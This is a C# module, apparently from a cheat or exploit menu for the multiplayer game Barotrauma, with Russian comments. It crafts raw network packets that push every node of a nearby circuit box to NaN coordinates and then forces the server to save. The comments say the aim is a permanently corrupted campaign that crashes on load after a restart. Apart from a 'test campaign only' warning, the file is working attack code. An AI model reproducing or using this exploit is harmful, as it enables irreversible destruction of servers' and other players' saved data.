using System;
using System.Collections.Generic;
using System.Collections.Immutable;
using Barotrauma;
using Barotrauma.Items.Components;
using Barotrauma.Networking;
using Microsoft.Xna.Framework;

namespace CSHUB.Modules
{
    // ============================================================
    //  SAVE CORRUPTER (волна 597) — ПЕРСИСТЕНТНАЯ ПОРЧА КАМПАНИИ.
    //  Единственный класс багов, который живёт ПОСЛЕ рестарта сервера.
    //
    //  КАК РАБОТАЕТ:
    //  1) NaN ВСЕ УЗЛЫ: MoveComponent с MoveAmount=NaN на ВСЕ известные
    //     узлы ближайшего circuit box (Components/ID публичные — без
    //     reflection). MoveNodesInternal переносит ВСЕ узлы в NaN,
    //     сервер рассылает это всем + хранит в состоянии цепи.
    //  2) ЗАФИКСИРОВАТЬ: ManageRound(end=true, save=true) — на
    //     дружелюбном аутпосте сервер делает SaveGame → NaN позиций
    //     УХОДИТ В СЕЙВ кампании.
    //  3) После рестарта: загрузка кампании = NaN в матрицах узлов →
    //     глюки рендера цепи/исключения. Кампания сломана НАВСЕГДА
    //     (без бэкапа).
    //
    //  ГЕЙТЫ: NaN — CanClientAccess circuit box (свой/рядом/соло).
    //  Фиксация — ManageRound-гейт: соло/перм ManageRound/окно 586.
    //
    //  ★★★ ТОЛЬКО НА СВОЕЙ ТЕСТ-КАМПАНИИ. ПОРЧА НЕОБРАТИМА. ★★★
    // ============================================================
    public class SaveCorrupterModule : CSModuleBase
    {
        public override string Id   => "save_corrupter";
        public override string Name => "Save Corrupter";
        public override string Description =>
            "Персистентная порча кампании (живёт после рестарта).\n\n" +
            "1. NaN ВСЕ УЗЛЫ — ближайший circuit box,\n" +
            "   все компоненты уходят в NaN-координаты\n" +
            "2. ЗАФИКСИРОВАТЬ СЕЙВ — сервер сохраняет\n" +
            "   испорченное состояние НАВСЕГДА\n\n" +
            "После рестарта сервера кампания крашится при загрузке.\n" +
            "★★★ ТОЛЬКО СВОЯ ТЕСТ-КАМПАНИЯ! НЕОБРАТИМО! ★★★";

        public override string Category => "exploit";

        private static readonly Color OkColor    = new Color(120, 255, 140);
        private static readonly Color DangerColor= new Color(255, 110, 110);
        private static readonly Color AccentColor= new Color(255, 170, 90);
        private static readonly Color WarnColor  = new Color(255, 220, 90);

        public override string GetLabel() => "Save Corrupter ☣️";

        public override void OnClick()
        {
            if (GameMain.Client == null)
            {
                GUI.AddMessage("[Corrupt] Нет подключения", DangerColor);
                return;
            }
            if (GameMain.GameSession?.Campaign == null)
            {
                GUI.AddMessage("[Corrupt] Нужна кампания", DangerColor);
                return;
            }

            var msgBox = new GUIMessageBox(
                "☣️ Save Corrupter",
                "ПЕРСИСТЕНТНАЯ ПОРЧА КАМПАНИИ.\n" +
                "После фиксации сейва кампания будет крашиться\n" +
                "при загрузке ПОСЛЕ рестарта сервера.\n\n" +
                "★★★ ТОЛЬКО НА СВОЕЙ ТЕСТ-КАМПАНИИ! ★★★\n" +
                "Портить чужие сохранения = бан навсегда.",
                new LocalizedString[] { "1️⃣ NaN ВСЕ УЗЛЫ", "2️⃣ ЗАФИКСИРОВАТЬ СЕЙВ", "Отмена" });

            msgBox.Buttons[0].Color = new Color(200, 60, 60);
            msgBox.Buttons[1].Color = new Color(200, 140, 40);

            msgBox.Buttons[0].OnClicked = (b, u) =>
            {
                msgBox.Close();
                NanAllNodes();
                return true;
            };
            msgBox.Buttons[1].OnClicked = (b, u) =>
            {
                msgBox.Close();
                ForceSave();
                return true;
            };
            msgBox.Buttons[2].OnClicked = (b, u) =>
            {
                msgBox.Close();
                return true;
            };
        }

        // ========================================================
        //  ШАГ 1: NaN на все узлы ближайшего circuit box
        // ========================================================
        private static void NanAllNodes()
        {
            if (GameMain.Client?.ClientPeer == null) { return; }
            if (GameMain.Client.GameStarted == false || Character.Controlled == null)
            {
                GUI.AddMessage("[Corrupt] Нужно быть в раунде с персонажем", DangerColor);
                return;
            }

            Character me = Character.Controlled;
            Item cbItem = null;
            CircuitBox cb = null;
            float bestD = 600f;
            foreach (Item it in Item.ItemList)
            {
                if (it == null || it.Removed) { continue; }
                CircuitBox candidate = null;
                try { candidate = it.GetComponent<CircuitBox>(); } catch { }
                if (candidate == null) { continue; }
                float d = Vector2.Distance(it.WorldPosition, me.WorldPosition);
                if (d < bestD) { bestD = d; cbItem = it; cb = candidate; }
            }

            if (cbItem == null || cb == null)
            {
                GUI.AddMessage("[Corrupt] Рядом (600ю) нет circuit box", DangerColor);
                return;
            }

            // Собираем ВСЕ ID узлов (Components/ID публичные)
            var ids = new List<ushort>();
            try
            {
                foreach (CircuitBoxComponent comp in cb.Components)
                {
                    if (comp == null) { continue; }
                    if (comp.ID != ICircuitBoxIdentifiable.NullComponentID) { ids.Add(comp.ID); }
                }
            }
            catch (Exception e)
            {
                GUI.AddMessage("[Corrupt] Компоненты не читаются: " + e.Message, DangerColor);
                return;
            }

            if (ids.Count == 0)
            {
                GUI.AddMessage("[Corrupt] В цепи нет компонентов (нечем портить)", DangerColor);
                return;
            }

            // Индекс CircuitBox-компонента на предмете
            int cbIndex = 0;
            try
            {
                for (int i = 0; i < cbItem.Components.Count; i++)
                {
                    if (cbItem.Components[i] is CircuitBox) { cbIndex = i; break; }
                }
            }
            catch { }

            // MoveComponent: ВСЕ TargetIDs → NaN
            IWriteMessage payload = new WriteOnlyMessage();
            payload.WriteRangedInteger(0, 0, 12);                       // EventType.ComponentState
            int comps = Math.Max(1, cbItem.Components.Count);
            payload.WriteRangedInteger(cbIndex, 0, comps - 1);
            payload.WriteByte((byte)CircuitBoxOpcode.MoveComponent);    // = 3

            var idArray = ImmutableArray.Create<ushort>(ids.ToArray());
            CircuitBoxMoveComponentEvent move = new CircuitBoxMoveComponentEvent(
                idArray,
                ImmutableArray.Create<CircuitBoxInputOutputNode.Type>(),
                ImmutableArray.Create<ushort>(ids.ToArray()),
                new Vector2(float.NaN, float.NaN));
            ((INetSerializableStruct)move).Write(payload);

            SendEntityEventRaw(cbItem.ID, payload);

            GUI.AddMessage("[Corrupt] ☣️ " + ids.Count + " узлов «" + cbItem.Name +
                           "» отправлены в NaN", WarnColor);
            GUI.AddMessage("[Corrupt] Теперь жми ЗАФИКСИРОВАТЬ (на аутпосте!)", AccentColor);
        }

        // ========================================================
        //  ШАГ 2: принудительный сейв замаравненного состояния
        //  SERVER_COMMAND → ManageRound(end=true, save=true) —
        //  на дружелюбном аутпосте сервер делает SaveGame (593).
        // ========================================================
        private static void ForceSave()
        {
            if (GameMain.Client?.ClientPeer == null) { return; }

            try
            {
                IWriteMessage msg = new WriteOnlyMessage();
                msg.WriteByte((byte)ClientPacketHeader.SERVER_COMMAND);
                msg.WriteUInt16((ushort)ClientPermissions.ManageRound);
                msg.WriteBoolean(true);     // end = true
                msg.WriteBoolean(true);     // save = true
                msg.WriteBoolean(false);    // quitCampaign = false
                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            }
            catch (Exception e)
            {
                GUI.AddMessage("[Corrupt] send fail: " + e.Message, DangerColor);
                return;
            }

            GUI.AddMessage("[Corrupt] 💾 Сейв отправлен (ManageRound+save).", OkColor);
            GUI.AddMessage("[Corrupt] Сработает: соло/перм ManageRound/окно 586,", AccentColor);
            GUI.AddMessage("[Corrupt] и только на дружелюбном аутпосте. После", AccentColor);
            GUI.AddMessage("[Corrupt] рестарта кампания будет крашиться. ☣️", AccentColor);
        }

        // ========================================================
        //  Хирургический entity-пакет (как в Crash Menu)
        // ========================================================
        private static string SendEntityEventRaw(ushort entityId, IWriteMessage payload)
        {
            ushort eid = 0;
            try { eid = (ushort)(GameMain.Client.LastSentEntityEventID + 1); } catch { }

            IWriteMessage body = new WriteOnlyMessage();
            body.WriteUInt16(0);                                   // characterStateID=0
            body.WriteBytes(payload.Buffer, 0, payload.LengthBytes);

            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.UPDATE_INGAME);
            msg.WriteBoolean(true);
            msg.WritePadBits();
            using (var segmentTable = SegmentTableWriter<ClientNetSegment>.StartWriting(msg))
            {
                segmentTable.StartNewSegment(ClientNetSegment.EntityState);
                msg.WritePadBits();
                msg.WriteUInt16(eid);
                msg.WriteByte(1);
                msg.WriteUInt16(entityId);
                msg.WriteVariableUInt32((uint)body.LengthBytes);
                msg.WriteBytes(body.Buffer, 0, body.LengthBytes);
            }
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "ok";
        }

        public override void Dispose() { base.Dispose(); }
    }
}
